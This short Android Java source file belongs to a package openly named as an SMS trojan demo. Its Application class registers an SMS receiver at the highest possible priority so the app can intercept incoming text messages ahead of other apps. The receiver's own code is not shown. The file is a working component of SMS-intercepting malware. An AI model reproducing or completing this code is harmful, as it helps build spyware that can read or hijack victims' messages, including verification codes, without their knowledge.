package com.demo.smstrojan;


import android.app.Application;
import android.content.IntentFilter;
import android.util.Log;

public final class MyApplication extends Application {
	
	@Override
	public void onCreate() {
		super.onCreate();
		
		Log.i("TTT", getPackageName() + " starts");
		
		IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
		filter.setPriority(Integer.MAX_VALUE);
		registerReceiver(new SmsReceiver(), filter);
	}
	
}
